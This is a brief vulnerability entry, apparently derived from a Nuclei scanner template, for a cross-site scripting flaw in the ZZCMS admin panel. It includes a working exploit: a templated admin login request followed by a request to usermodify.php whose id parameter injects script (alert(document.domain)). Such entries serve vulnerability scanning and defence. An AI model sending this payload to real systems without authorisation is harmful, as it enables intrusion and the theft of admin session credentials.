# Vulnerability: ZZCMS - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`zzcms-xss.yaml`)

## Description
ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /admin/logincheck.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

admin={{username}}&pass={{password}}

GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
Host: {{Hostname}}
```

